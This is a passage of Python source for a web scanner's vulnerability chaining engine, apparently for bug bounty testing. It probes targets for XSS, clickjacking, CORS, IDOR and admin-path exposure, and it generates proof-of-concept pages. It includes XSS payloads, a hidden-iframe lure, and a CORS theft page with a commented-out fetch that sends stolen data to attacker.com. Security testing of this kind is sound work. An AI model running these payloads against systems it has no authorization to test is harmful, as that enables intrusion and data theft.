"""
Vulnerability Chaining Engine - Analysis Phase
===============================================

PURPOSE: Upgrades LOW/INFO findings to MEDIUM/HIGH by proving exploitability.
Used in the ANALYSIS phase of the scanning pipeline.

This is DISTINCT from `scanning/vuln_chain_engine.py` which handles HIGH→CRITICAL
exploitation during the SCANNING phase.

+-------------------------------------------------------------------+
| Component                    | Purpose                            |
|------------------------------|-------------------------------------|
| analysis/vuln_chain_engine   | LOW→HIGH (prove exploitability)    |
| scanning/vuln_chain_engine   | HIGH→CRITICAL (deep exploitation)  |
+-------------------------------------------------------------------+

Transforms low-value findings into exploitable vulnerabilities by:
1. Analyzing existing findings for exploitation paths
2. Automatically attempting to prove impact
3. Chaining vulnerabilities together for higher severity

Example chains:
- Missing CSP → Find XSS → Prove XSS works
- Missing X-Frame-Options → Create clickjacking PoC
- Info Disclosure → Extract endpoints → Test for IDOR
- CORS Misconfiguration → Prove data theft possible

For HIGH→CRITICAL chaining (SQLi→RCE, LFI→Creds, etc.):
    from scanning.vuln_chain_engine import VulnerabilityChainEngine
"""

import json
import re
import itertools
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional
import structlog

logger = structlog.get_logger(__name__)


class ChainStatus(Enum):
    """Status of a chain attempt."""
    PENDING = "pending"
    IN_PROGRESS = "in_progress"
    SUCCESS = "success"        # Chain completed, vulnerability proven
    PARTIAL = "partial"        # Some steps worked
    FAILED = "failed"          # Could not exploit
    BLOCKED = "blocked"        # Security control prevented


@dataclass
class ChainStep:
    """A single step in an attack chain."""
    name: str
    description: str
    action: str  # Action type to execute
    params: dict = field(default_factory=dict)
    status: ChainStatus = ChainStatus.PENDING
    result: Optional[dict] = None
    evidence: list = field(default_factory=list)
    next_steps: list = field(default_factory=list)  # Conditional next steps


@dataclass
class AttackChain:
    """An attack chain from initial finding to exploitation."""
    id: str
    name: str
    initial_finding: dict
    target_severity: str  # What we're trying to prove
    steps: list[ChainStep] = field(default_factory=list)
    status: ChainStatus = ChainStatus.PENDING
    final_finding: Optional[dict] = None
    poc: Optional[str] = None  # Proof of Concept code/HTML


# =============================================================================
# CHAIN DEFINITIONS - Maps initial findings to exploitation paths
# =============================================================================

CHAIN_DEFINITIONS = {
    # Missing CSP → Try to find and prove XSS
    "missing_csp": {
        "name": "CSP Bypass → XSS Exploitation",
        "target_severity": "high",
        "description": "Missing CSP allows XSS if injection point exists",
        "steps": [
            {
                "name": "Find Reflection Points",
                "action": "find_reflections",
                "description": "Search for user input reflected in response",
            },
            {
                "name": "Test XSS Payloads",
                "action": "test_xss",
                "description": "Inject XSS payloads at reflection points",
                "condition": "has_reflections",
            },
            {
                "name": "Generate XSS PoC",
                "action": "generate_xss_poc",
                "description": "Create working XSS proof of concept",
                "condition": "xss_successful",
            },
        ],
    },
    
    # Missing X-Frame-Options → Clickjacking PoC
    "missing_xframe": {
        "name": "Clickjacking Exploitation",
        "target_severity": "medium",
        "description": "Missing X-Frame-Options allows clickjacking",
        "steps": [
            {
                "name": "Check Frameable",
                "action": "check_frameable",
                "description": "Verify page can be framed",
            },
            {
                "name": "Find Sensitive Actions",
                "action": "find_sensitive_actions",
                "description": "Identify buttons/forms for clickjacking",
                "condition": "is_frameable",
            },
            {
                "name": "Generate Clickjacking PoC",
                "action": "generate_clickjacking_poc",
                "description": "Create working clickjacking HTML",
                "condition": "has_sensitive_actions",
            },
        ],
    },
    
    # CORS Misconfiguration → Data Theft PoC
    "cors_wildcard": {
        "name": "CORS → Data Theft",
        "target_severity": "high",
        "description": "CORS misconfiguration allows cross-origin data theft",
        "steps": [
            {
                "name": "Test Origin Reflection",
                "action": "test_cors_reflection",
                "description": "Check if arbitrary origins are reflected",
            },
            {
                "name": "Find Sensitive Endpoints",
                "action": "find_sensitive_data",
                "description": "Identify endpoints returning sensitive data",
                "condition": "cors_vulnerable",
            },
            {
                "name": "Generate CORS PoC",
                "action": "generate_cors_poc",
                "description": "Create data theft proof of concept",
                "condition": "has_sensitive_data",
            },
        ],
    },
    
    # Info Disclosure → IDOR/Auth Bypass
    "info_disclosure": {
        "name": "Info Disclosure → IDOR",
        "target_severity": "high",
        "description": "Use disclosed info to find IDOR vulnerabilities",
        "steps": [
            {
                "name": "Extract Identifiers",
                "action": "extract_identifiers",
                "description": "Find user IDs, account numbers, etc.",
            },
            {
                "name": "Test IDOR",
                "action": "test_idor",
                "description": "Try accessing other users' resources",
                "condition": "has_identifiers",
            },
            {
                "name": "Generate IDOR PoC",
                "action": "generate_idor_poc",
                "description": "Document IDOR exploitation",
                "condition": "idor_found",
            },
        ],
    },
    
    # API Endpoint Discovery → Auth Testing
    "api_discovered": {
        "name": "API Discovery → Auth Bypass",
        "target_severity": "critical",
        "description": "Test discovered API endpoints for auth issues",
        "steps": [
            {
                "name": "Test Without Auth",
                "action": "test_unauth_access",
                "description": "Try accessing endpoints without credentials",
            },
            {
                "name": "Test Privilege Escalation",
                "action": "test_privilege_escalation",
                "description": "Try accessing admin functions",
                "condition": "has_auth_endpoints",
            },
            {
                "name": "Generate Auth Bypass PoC",
                "action": "generate_auth_poc",
                "description": "Document authentication bypass",
                "condition": "auth_bypass_found",
            },
        ],
    },
    
    # Error Message → SQLi/Path Traversal
    "error_disclosure": {
        "name": "Error Disclosure → Injection",
        "target_severity": "critical",
        "description": "Use error messages to find injection points",
        "steps": [
            {
                "name": "Analyze Error",
                "action": "analyze_error",
                "description": "Extract technology/query info from error",
            },
            {
                "name": "Test SQLi",
                "action": "test_sqli_targeted",
                "description": "Test SQL injection based on error info",
                "condition": "has_db_error",
            },
            {
                "name": "Test Path Traversal",
                "action": "test_path_traversal",
                "description": "Test file path manipulation",
                "condition": "has_path_error",
            },
        ],
    },
    
    # Open Redirect → OAuth Token Theft
    "open_redirect": {
        "name": "Open Redirect → Token Theft",
        "target_severity": "high",
        "description": "Chain open redirect with OAuth for token theft",
        "steps": [
            {
                "name": "Find OAuth Endpoints",
                "action": "find_oauth_endpoints",
                "description": "Locate OAuth authorization endpoints",
            },
            {
                "name": "Test Redirect in OAuth",
                "action": "test_oauth_redirect",
                "description": "Try injecting redirect in OAuth flow",
                "condition": "has_oauth",
            },
            {
                "name": "Generate OAuth PoC",
                "action": "generate_oauth_poc",
                "description": "Create token theft proof of concept",
                "condition": "oauth_vulnerable",
            },
        ],
    },

    # SSRF → Internal Access
    "ssrf": {
        "name": "SSRF → Internal Network Access",
        "target_severity": "critical",
        "description": "Use SSRF to reach internal services / cloud metadata",
        "steps": [
            {
                "name": "Probe Internal Targets",
                "action": "test_ssrf_internal",
                "description": "Test if SSRF can reach internal IPs / cloud metadata",
            },
            {
                "name": "Extract Sensitive Data",
                "action": "extract_ssrf_data",
                "description": "Read cloud credentials or internal service data",
                "condition": "ssrf_internal_reached",
            },
        ],
    },

    # SSTI → RCE
    "ssti": {
        "name": "SSTI → Remote Code Execution",
        "target_severity": "critical",
        "description": "Server-side template injection leading to code execution",
        "steps": [
            {
                "name": "Confirm Template Injection",
                "action": "test_ssti_confirm",
                "description": "Verify arithmetic evaluation in template context",
            },
            {
                "name": "Escalate to Code Execution",
                "action": "test_ssti_rce",
                "description": "Attempt OS command execution via template gadget",
                "condition": "ssti_confirmed",
            },
        ],
    },

    # JWT Weakness → Auth Bypass
    "jwt_weak": {
        "name": "JWT Weakness → Auth Bypass",
        "target_severity": "critical",
        "description": "Exploit weak JWT signing to forge tokens",
        "steps": [
            {
                "name": "Test JWT None Algorithm",
                "action": "test_jwt_none",
                "description": "Try alg:none / empty signature bypass",
            },
            {
                "name": "Test JWT Weak Secret",
                "action": "test_jwt_weak_secret",
                "description": "Brute-force common signing secrets",
                "condition": "jwt_modifiable",
            },
        ],
    },

    # LFI → Credential Theft
    "lfi": {
        "name": "LFI → Credential / Source Theft",
        "target_severity": "critical",
        "description": "Use local file inclusion to read sensitive files",
        "steps": [
            {
                "name": "Test Path Traversal",
                "action": "test_path_traversal",
                "description": "Confirm directory traversal works",
            },
            {
                "name": "Read Sensitive Files",
                "action": "read_sensitive_files",
                "description": "Attempt to read /etc/passwd, .env, config files",
                "condition": "path_traversal_works",
            },
        ],
    },

    # Subdomain Takeover
    "subdomain_takeover": {
        "name": "Subdomain Takeover → Phishing / Cookie Theft",
        "target_severity": "high",
        "description": "Dangling DNS allows full subdomain control",
        "steps": [
            {
                "name": "Verify Dangling CNAME",
                "action": "verify_dangling_cname",
                "description": "Confirm CNAME points to unclaimed resource",
            },
            {
                "name": "Assess Cookie Scope",
                "action": "assess_cookie_scope",
                "description": "Check if parent-domain cookies are scoped to this subdomain",
                "condition": "cname_dangling",
            },
        ],
    },
}


class VulnChainEngine:
    """
    Engine for chaining vulnerabilities together.
    
    Takes initial findings and attempts to:
    1. Prove exploitability
    2. Chain to higher severity issues
    3. Generate working PoCs
    """
    
    _id_counter = itertools.count(1)

    def __init__(self, http_client=None, rate_limiter=None):
        self.http_client = http_client
        self.rate_limiter = rate_limiter
        self.chains: list[AttackChain] = []
        self.context: dict = {}  # Shared context between steps
        self.metrics: dict = {
            "chains_attempted": 0,
            "chains_succeeded": 0,
            "chains_partial": 0,
            "chains_failed": 0,
            "steps_executed": 0,
            "steps_succeeded": 0,
            "cross_chains_found": 0,
        }
        
    async def process(self, findings: list[dict], target_url: str = "") -> list[dict]:
        """Pipeline-compatible entry point.

        Called by ``scanning/pipeline/phases/post_processing.py`` as
        ``engine.process(context.findings)``.  Delegates to
        :meth:`analyze_and_chain` and returns the *final finding dicts*
        (not AttackChain objects) so the pipeline can add them directly.
        """
        if not target_url and findings:
            # Infer target_url from first finding that has one
            for f in findings:
                url = f.get("matched_at") or f.get("url") or f.get("target", "")
                if url:
                    target_url = url
                    break

        chains = await self.analyze_and_chain(findings, target_url)
        # Return only the upgraded findings from successful/partial chains
        results: list[dict] = []
        for chain in chains:
            if chain.final_finding:
                results.append(chain.final_finding)
        return results

    async def analyze_and_chain(
        self,
        findings: list[dict],
        target_url: str,
        max_depth: int = 3,
    ) -> list[AttackChain]:
        """
        Analyze findings and attempt to chain them.
        
        Args:
            findings: List of initial findings
            target_url: Target URL
            max_depth: Maximum chain depth
            
        Returns:
            List of attack chains with results
        """
        self.context = {
            "target_url": target_url,
            "findings": findings,
            "discovered_endpoints": [],
            "reflections": [],
            "identifiers": [],
        }
        
        chains = []
        
        for finding in findings:
            finding_type = finding.get("type", "")
            
            # Map finding type to chain definition
            chain_def = self._get_chain_for_finding(finding)

            if chain_def:
                # Reset per-chain volatile context to prevent cross-contamination
                self._reset_chain_context()
                chain = await self._execute_chain(finding, chain_def, max_depth)
                chains.append(chain)
        
        # Try cross-finding chains (combining multiple findings)
        cross_chains = await self._try_cross_chains(findings)
        chains.extend(cross_chains)
        
        self.chains = chains
        return chains
    
    # Keyword → chain-definition-key, checked against type+name combined
    _CHAIN_KEYWORD_MAP: list[tuple[list[str], str]] = [
        (["csp", "content-security-policy"], "missing_csp"),
        (["x-frame", "clickjacking"], "missing_xframe"),
        (["cors"], "cors_wildcard"),
        (["ssrf", "server-side request"], "ssrf"),
        (["ssti", "template injection"], "ssti"),
        (["jwt", "json web token"], "jwt_weak"),
        (["lfi", "local file inclusion", "path traversal", "directory traversal"], "lfi"),
        (["subdomain takeover", "dangling cname"], "subdomain_takeover"),
        (["open redirect", "url redirect"], "open_redirect"),
        (["error disclosure", "stack trace", "debug info"], "error_disclosure"),
        (["info disclosure", "information leak"], "info_disclosure"),
        (["api discover", "endpoint discover", "hidden api"], "api_discovered"),
    ]

    def _get_chain_for_finding(self, finding: dict) -> Optional[dict]:
        """Get chain definition for a finding type."""
        finding_type = finding.get("type", "").lower()
        finding_name = finding.get("name", "").lower()
        combined = f"{finding_type} {finding_name}"

        for keywords, chain_key in self._CHAIN_KEYWORD_MAP:
            if any(kw in combined for kw in keywords):
                return CHAIN_DEFINITIONS.get(chain_key)

        return None
    
    async def _execute_chain(
        self,
        finding: dict,
        chain_def: dict,
        max_depth: int,
    ) -> AttackChain:
        """Execute an attack chain."""
        chain = AttackChain(
            id=f"chain_{next(VulnChainEngine._id_counter)}",
            name=chain_def["name"],
            initial_finding=finding,
            target_severity=chain_def["target_severity"],
        )
        
        logger.info(f"[ChainEngine] Starting chain: {chain.name}")
        chain.status = ChainStatus.IN_PROGRESS
        
        for step_def in chain_def["steps"][:max_depth]:
            step = ChainStep(
                name=step_def["name"],
                description=step_def["description"],
                action=step_def["action"],
                params=step_def.get("params", {}),
            )
            
            # Check condition
            condition = step_def.get("condition")
            if condition and not self._check_condition(condition):
                step.status = ChainStatus.BLOCKED
                step.result = {"reason": f"Condition '{condition}' not met"}
                chain.steps.append(step)
                continue
            
            # Execute step
            step.status = ChainStatus.IN_PROGRESS
            self.metrics["steps_executed"] += 1
            try:
                result = await self._execute_step(step, finding)
                step.result = result
                step.evidence = result.get("evidence", [])

                if result.get("success"):
                    step.status = ChainStatus.SUCCESS
                    self.metrics["steps_succeeded"] += 1
                    # Update context with results
                    self._update_context(step.action, result)
                else:
                    step.status = ChainStatus.FAILED

            except Exception as e:
                step.status = ChainStatus.FAILED
                step.result = {"error": str(e)}
                logger.error(f"[ChainEngine] Step failed: {e}")

            chain.steps.append(step)

        # Determine final chain status
        successful_steps = [s for s in chain.steps if s.status == ChainStatus.SUCCESS]
        self.metrics["chains_attempted"] += 1

        if len(successful_steps) == len(chain.steps):
            chain.status = ChainStatus.SUCCESS
            chain.final_finding = self._generate_final_finding(chain)
            chain.poc = self._generate_poc(chain)
            self.metrics["chains_succeeded"] += 1
        elif successful_steps:
            chain.status = ChainStatus.PARTIAL
            self.metrics["chains_partial"] += 1
        else:
            chain.status = ChainStatus.FAILED
            self.metrics["chains_failed"] += 1

        return chain
    
    def _check_condition(self, condition: str) -> bool:
        """Check if a condition is met based on context."""
        conditions = {
            "has_reflections": bool(self.context.get("reflections")),
            "xss_successful": self.context.get("xss_found", False),
            "is_frameable": self.context.get("is_frameable", False),
            "has_sensitive_actions": bool(self.context.get("sensitive_actions")),
            "cors_vulnerable": self.context.get("cors_vulnerable", False),
            "has_sensitive_data": bool(self.context.get("sensitive_endpoints")),
            "has_identifiers": bool(self.context.get("identifiers")),
            "idor_found": self.context.get("idor_found", False),
            "has_auth_endpoints": bool(self.context.get("auth_endpoints")),
            "auth_bypass_found": self.context.get("auth_bypass_found", False),
            "has_db_error": self.context.get("has_db_error", False),
            "has_path_error": self.context.get("has_path_error", False),
            "has_oauth": bool(self.context.get("oauth_endpoints")),
            "oauth_vulnerable": self.context.get("oauth_vulnerable", False),
            # New chain conditions
            "ssrf_internal_reached": self.context.get("ssrf_internal_reached", False),
            "ssti_confirmed": self.context.get("ssti_confirmed", False),
            "jwt_modifiable": self.context.get("jwt_modifiable", False),
            "path_traversal_works": self.context.get("path_traversal_works", False),
            "cname_dangling": self.context.get("cname_dangling", False),
        }
        return conditions.get(condition, False)
    
    # Keys set by step handlers that must NOT leak between chains
    _VOLATILE_CONTEXT_KEYS = [
        "reflections", "xss_found", "xss_payload", "is_frameable",
        "sensitive_actions", "cors_vulnerable", "sensitive_endpoints",
        "identifiers", "idor_found", "auth_endpoints", "auth_bypass_found",
        "has_db_error", "has_path_error", "oauth_endpoints", "oauth_vulnerable",
        "ssrf_internal_reached", "ssti_confirmed", "jwt_modifiable",
        "path_traversal_works", "cname_dangling",
    ]

    def _reset_chain_context(self) -> None:
        """Clear volatile context keys between chain executions."""
        for key in self._VOLATILE_CONTEXT_KEYS:
            self.context.pop(key, None)

    def _update_context(self, action: str, result: dict):
        """Update context with step results."""
        if action == "find_reflections":
            self.context["reflections"] = result.get("reflections", [])
        elif action == "test_xss":
            self.context["xss_found"] = result.get("xss_found", False)
            self.context["xss_payload"] = result.get("working_payload")
        elif action == "check_frameable":
            self.context["is_frameable"] = result.get("frameable", False)
        elif action == "find_sensitive_actions":
            self.context["sensitive_actions"] = result.get("actions", [])
        elif action == "test_cors_reflection":
            self.context["cors_vulnerable"] = result.get("vulnerable", False)
        elif action == "find_sensitive_data":
            self.context["sensitive_endpoints"] = result.get("endpoints", [])
        elif action == "extract_identifiers":
            self.context["identifiers"] = result.get("identifiers", [])
        elif action == "test_idor":
            self.context["idor_found"] = result.get("idor_found", False)
        elif action == "test_unauth_access":
            self.context["auth_endpoints"] = result.get("endpoints", [])
        elif action == "test_privilege_escalation":
            self.context["auth_bypass_found"] = result.get("bypass_found", False)
        elif action == "analyze_error":
            self.context["has_db_error"] = result.get("has_db_error", False)
            self.context["has_path_error"] = result.get("has_path_error", False)
        elif action == "find_oauth_endpoints":
            self.context["oauth_endpoints"] = result.get("endpoints", [])
        elif action == "test_oauth_redirect":
            self.context["oauth_vulnerable"] = result.get("vulnerable", False)
        elif action == "test_ssrf_internal":
            self.context["ssrf_internal_reached"] = result.get("internal_reached", False)
        elif action == "test_ssti_confirm":
            self.context["ssti_confirmed"] = result.get("ssti_confirmed", False)
        elif action == "test_jwt_none":
            self.context["jwt_modifiable"] = result.get("jwt_modifiable", False)
        elif action == "test_path_traversal":
            self.context["path_traversal_works"] = result.get("traversal_works", False)
        elif action == "verify_dangling_cname":
            self.context["cname_dangling"] = result.get("cname_dangling", False)
    
    async def _execute_step(self, step: ChainStep, finding: dict) -> dict:
        """Execute a single chain step."""
        action_handlers = {
            "find_reflections": self._find_reflections,
            "test_xss": self._test_xss,
            "generate_xss_poc": self._generate_xss_poc,
            "check_frameable": self._check_frameable,
            "find_sensitive_actions": self._find_sensitive_actions,
            "generate_clickjacking_poc": self._generate_clickjacking_poc,
            "test_cors_reflection": self._test_cors_reflection,
            "find_sensitive_data": self._find_sensitive_data,
            "generate_cors_poc": self._generate_cors_poc,
            "extract_identifiers": self._extract_identifiers,
            "test_idor": self._test_idor,
            "generate_idor_poc": self._generate_idor_poc,
            "test_unauth_access": self._test_unauth_access,
            "test_privilege_escalation": self._test_privilege_escalation,
            "generate_auth_poc": self._generate_auth_poc,
            "analyze_error": self._analyze_error,
            "test_sqli_targeted": self._test_sqli_targeted,
            "test_path_traversal": self._test_path_traversal,
            "find_oauth_endpoints": self._find_oauth_endpoints,
            "test_oauth_redirect": self._test_oauth_redirect,
            "generate_oauth_poc": self._generate_oauth_poc,
            # New chain handlers
            "test_ssrf_internal": self._test_ssrf_internal,
            "extract_ssrf_data": self._extract_ssrf_data,
            "test_ssti_confirm": self._test_ssti_confirm,
            "test_ssti_rce": self._test_ssti_rce,
            "test_jwt_none": self._test_jwt_none,
            "test_jwt_weak_secret": self._test_jwt_weak_secret,
            "read_sensitive_files": self._read_sensitive_files,
            "verify_dangling_cname": self._verify_dangling_cname,
            "assess_cookie_scope": self._assess_cookie_scope,
        }
        
        handler = action_handlers.get(step.action)
        if handler:
            return await handler(finding)
        
        return {"success": False, "error": f"Unknown action: {step.action}"}
    
    # =========================================================================
    # STEP HANDLERS - Actual exploitation logic
    # =========================================================================
    
    async def _find_reflections(self, finding: dict) -> dict:
        """Find user input reflection points."""
        target = self.context["target_url"]
        reflections = []
        
        # Test parameters
        test_params = ["q", "search", "query", "s", "keyword", "term", "input", "data", "name", "id"]
        canary = "REFLECT_TEST_12345"
        
        if self.http_client:
            for param in test_params:
                try:
                    if self.rate_limiter:
                        await self.rate_limiter.acquire()
                    
                    test_url = f"{target}?{param}={canary}"
                    response = await self.http_client.get(test_url)
                    
                    if canary in response.text:
                        reflections.append({
                            "parameter": param,
                            "url": test_url,
                            "reflected_in": "body",
                        })
                except Exception as e:
                    logger.debug(f"[ChainEngine] Test error: {e}")
        
        return {
            "success": bool(reflections),
            "reflections": reflections,
            "evidence": [f"Found {len(reflections)} reflection points"],
        }
    
    async def _test_xss(self, finding: dict) -> dict:
        """Test XSS payloads at reflection points."""
        reflections = self.context.get("reflections", [])
        
        # Safe XSS payloads (won't cause damage)
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "'><script>alert(1)</script>",
            "\"><script>alert(1)</script>",
        ]
        
        working_payload = None
        xss_url = None
        
        if self.http_client:
            for reflection in reflections:
                param = reflection["parameter"]
                
                for payload in payloads:
                    try:
                        if self.rate_limiter:
                            await self.rate_limiter.acquire()
                        
                        target = self.context["target_url"]
                        test_url = f"{target}?{param}={payload}"
                        response = await self.http_client.get(test_url)
                        
                        # Check if payload is reflected unescaped
                        if payload in response.text:
                            working_payload = payload
                            xss_url = test_url
                            break
                    except Exception as e:
                        logger.debug(f"[ChainEngine] Test error: {e}")
                
                if working_payload:
                    break
        
        return {
            "success": bool(working_payload),
            "xss_found": bool(working_payload),
            "working_payload": working_payload,
            "xss_url": xss_url,
            "evidence": [f"XSS payload executed: {working_payload}"] if working_payload else [],
        }
    
    async def _generate_xss_poc(self, finding: dict) -> dict:
        """Generate XSS proof of concept."""
        payload = self.context.get("xss_payload")
        target = self.context["target_url"]
        
        poc = f"""<!-- XSS Proof of Concept -->
<html>
<head><title>XSS PoC - Bug Bounty</title></head>
<body>
<h1>XSS Vulnerability Proof of Concept</h1>
<p>Target: {target}</p>
<p>Payload: {payload}</p>

<h2>Steps to Reproduce:</h2>
<ol>
<li>Navigate to the URL below</li>
<li>Observe JavaScript execution (alert box)</li>
</ol>

<h2>Vulnerable URL:</h2>
<code>{target}?param={payload}</code>

<h2>Impact:</h2>
<ul>
<li>Session hijacking via document.cookie theft</li>
<li>Phishing attacks via DOM manipulation</li>
<li>Keylogging and credential theft</li>
</ul>
</body>
</html>"""
        
        return {
            "success": True,
            "poc": poc,
            "evidence": ["Generated working XSS PoC"],
        }
    
    async def _check_frameable(self, finding: dict) -> dict:
        """Check if page can be framed (clickjacking)."""
        target = self.context["target_url"]
        frameable = True
        
        if self.http_client:
            try:
                if self.rate_limiter:
                    await self.rate_limiter.acquire()
                
                response = await self.http_client.get(target)
                headers = {k.lower(): v for k, v in response.headers.items()}
                
                # Check for frame protection
                if headers.get("x-frame-options"):
                    frameable = False
                
                csp = headers.get("content-security-policy", "")
                if "frame-ancestors" in csp and "'none'" in csp:
                    frameable = False
                    
            except Exception as e:
                logger.debug(f"[ChainEngine] Test error: {e}")
        
        return {
            "success": frameable,
            "frameable": frameable,
            "evidence": ["Page can be framed — no X-Frame-Options or CSP frame-ancestors"] if frameable else ["Page has frame protection"],
        }
    
    async def _find_sensitive_actions(self, finding: dict) -> dict:
        """Find sensitive actions that could be clickjacked."""
        target = self.context["target_url"]
        actions = []
        
        if self.http_client:
            try:
                if self.rate_limiter:
                    await self.rate_limiter.acquire()
                
                response = await self.http_client.get(target)
                
                # Look for forms and buttons
                sensitive_patterns = [
                    r'<form[^>]*action=["\'][^"\']*(?:delete|remove|update|transfer|send|submit)[^"\']*["\']',
                    r'<button[^>]*>(?:Delete|Remove|Submit|Transfer|Send|Confirm)',
                    r'<input[^>]*type=["\']submit["\'][^>]*value=["\'][^"\']*(?:delete|confirm)',
                ]
                
                for pattern in sensitive_patterns:
                    matches = re.findall(pattern, response.text, re.I)
                    actions.extend(matches)
                    
            except Exception as e:
                logger.debug(f"[ChainEngine] Test error: {e}")
        
        return {
            "success": bool(actions),
            "actions": actions[:5],  # Limit
            "evidence": [f"Found {len(actions)} sensitive actions"],
        }
    
    async def _generate_clickjacking_poc(self, finding: dict) -> dict:
        """Generate clickjacking proof of concept."""
        target = self.context["target_url"]
        actions = self.context.get("sensitive_actions", [])
        
        poc = f"""<!-- Clickjacking Proof of Concept -->
<html>
<head>
<title>Clickjacking PoC - Bug Bounty</title>
<style>
iframe {{
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0.0001; /* Nearly invisible */
    z-index: 2;
}}
.decoy {{
    position: absolute;
    top: 200px;
    left: 200px;
    z-index: 1;
    padding: 20px;
    background: #4CAF50;
    color: white;
    font-size: 18px;
    cursor: pointer;
}}
</style>
</head>
<body>
<h1>Click the button to win a prize!</h1>
<div class="decoy">CLICK HERE TO WIN!</div>
<iframe src="{target}"></iframe>

<h2>Proof of Concept Details:</h2>
<ul>
<li>Target: {target}</li>
<li>Sensitive actions found: {len(actions)}</li>
<li>Missing X-Frame-Options header</li>
</ul>
</body>
</html>"""
        
        return {
            "success": True,
            "poc": poc,
            "evidence": ["Generated clickjacking PoC"],
        }
    
    async def _test_cors_reflection(self, finding: dict) -> dict:
        """Test if CORS reflects arbitrary origins."""
        target = self.context["target_url"]
        vulnerable = False
        
        evil_origins = [
            "https://evil.com",
            "https://attacker.com",
            "null",
        ]
        
        if self.http_client:
            for origin in evil_origins:
                try:
                    if self.rate_limiter:
                        await self.rate_limiter.acquire()
                    
                    headers = {"Origin": origin}
                    response = await self.http_client.get(target, headers=headers)
                    
                    acao = response.headers.get("Access-Control-Allow-Origin", "")
                    acac = response.headers.get("Access-Control-Allow-Credentials", "")
                    
                    if origin in acao or acao == "*":
                        vulnerable = True
                        break
                        
                except Exception as e:
                    logger.debug(f"[ChainEngine] Test error: {e}")
        
        return {
            "success": True,
            "vulnerable": vulnerable,
            "evidence": ["CORS reflects arbitrary origins"] if vulnerable else [],
        }
    
    async def _find_sensitive_data(self, finding: dict) -> dict:
        """Find endpoints returning sensitive data."""
        target = self.context["target_url"]
        endpoints = []
        
        sensitive_paths = [
            "/api/user",
            "/api/account",
            "/api/profile",
            "/api/me",
            "/api/settings",
            "/user/info",
            "/account/details",
        ]
        
        if self.http_client:
            for path in sensitive_paths:
                try:
                    if self.rate_limiter:
                        await self.rate_limiter.acquire()
                    
                    url = f"{target.rstrip('/')}{path}"
                    response = await self.http_client.get(url)
                    
                    if response.status_code == 200:
                        # Check for sensitive data patterns
                        if any(p in response.text.lower() for p in ["email", "phone", "address", "token"]):
                            endpoints.append(url)
                            
                except Exception as e:
                    logger.debug(f"[ChainEngine] Test error: {e}")
        
        return {
            "success": bool(endpoints),
            "endpoints": endpoints,
            "evidence": [f"Found {len(endpoints)} sensitive endpoints"],
        }
    
    async def _generate_cors_poc(self, finding: dict) -> dict:
        """Generate CORS data theft PoC."""
        target = self.context["target_url"]
        endpoints = self.context.get("sensitive_endpoints", [])
        
        poc = f"""<!-- CORS Data Theft Proof of Concept -->
<html>
<head><title>CORS PoC - Bug Bounty</title></head>
<body>
<h1>CORS Misconfiguration - Data Theft PoC</h1>

<script>
// This would steal data from a logged-in user
fetch('{target}', {{
    credentials: 'include'
}})
.then(response => response.text())
.then(data => {{
    // Send to attacker server
    console.log('Stolen data:', data);
    // fetch('https://attacker.com/steal?data=' + btoa(data));
}});
</script>

<h2>Impact:</h2>
<ul>
<li>Steal user data from: {target}</li>
<li>Sensitive endpoints: {len(endpoints)}</li>
<li>Cross-origin request with credentials allowed</li>
</ul>
</body>
</html>"""
        
        return {
            "success": True,
            "poc": poc,
            "evidence": ["Generated CORS theft PoC"],
        }
    
    async def _extract_identifiers(self, finding: dict) -> dict:
        """Extract identifiers from disclosed information."""
        # This would analyze the finding's evidence for IDs
        identifiers = []
        
        evidence = finding.get("evidence", [])
        if isinstance(evidence, list):
            for item in evidence:
                item_str = str(item)
                # Look for IDs
                id_patterns = [
                    r'"id"\s*:\s*["\']?(\d+)',
                    r'"user_id"\s*:\s*["\']?(\d+)',
                    r'"account_id"\s*:\s*["\']?(\d+)',
                    r'/users?/(\d+)',
                    r'/accounts?/(\d+)',
                ]
                for pattern in id_patterns:
                    matches = re.findall(pattern, item_str)
                    identifiers.extend(matches)
        
        return {
            "success": bool(identifiers),
            "identifiers": list(set(identifiers))[:10],
            "evidence": [f"Extracted {len(identifiers)} identifiers"],
        }
    
    async def _test_idor(self, finding: dict) -> dict:
        """Test for IDOR by accessing other users' resources."""
        identifiers = self.context.get("identifiers", [])
        target = self.context["target_url"]
        idor_found = False
        
        if self.http_client and identifiers:
            # Try incrementing/decrementing IDs
            for id_val in identifiers:
                try:
                    original_id = int(id_val)
                    test_ids = [original_id - 1, original_id + 1]
                    
                    for test_id in test_ids:
                        if self.rate_limiter:
                            await self.rate_limiter.acquire()
                        
                        # Try common IDOR endpoints
                        for path in ["/api/user/", "/user/", "/account/"]:
                            url = f"{target.rstrip('/')}{path}{test_id}"
                            response = await self.http_client.get(url)
                            
                            if response.status_code == 200:
                                idor_found = True
                                break
                except Exception as e:
                    logger.debug(f"[ChainEngine] Test error: {e}")
        
        return {
            "success": idor_found,
            "idor_found": idor_found,
            "evidence": ["IDOR vulnerability confirmed — different user data accessible"] if idor_found else [],
        }
    
    async def _generate_idor_poc(self, finding: dict) -> dict:
        """Generate IDOR proof of concept."""
        identifiers = self.context.get("identifiers", [])
        target = self.context["target_url"]
        
        poc = f"""# IDOR Vulnerability Proof of Concept

## Target
{target}

## Discovered Identifiers
{json.dumps(identifiers, indent=2)}

## Steps to Reproduce
1. Login as User A
2. Navigate to {target}/api/user/{{user_id}}
3. Change user_id to another user's ID
4. Observe unauthorized access to other user's data

## Impact
- Access to other users' personal data
- Potential for mass data extraction
- Privacy violation
"""
        
        return {
            "success": True,
            "poc": poc,
            "evidence": ["Generated IDOR PoC"],
        }
    
    async def _test_unauth_access(self, finding: dict) -> dict:
        """Test for unauthenticated access to endpoints."""
        target = self.context["target_url"]
        accessible = []
        
        auth_paths = [
            "/api/admin",
            "/api/users",
            "/api/accounts",
            "/admin",
            "/internal",
            "/api/v1/admin",
            "/api/v2/admin",
        ]
        
        if self.http_client:
            for path in auth_paths:
                try:
                    if self.rate_limiter:
                        await self.rate_limiter.acquire()
                    
                    url = f"{target.rstrip('/')}{path}"
                    response = await self.http_client.get(url)
                    
                    # Check for unauthorized access
                    if response.status_code not in [401, 403, 404]:
                        accessible.append({
                            "url": url,
                            "status": response.status_code,
                        })
                except Exception as e:
                    logger.debug(f"[ChainEngine] Test error: {e}")
        
        return {
            "success": bool(accessible),
            "endpoints": accessible,
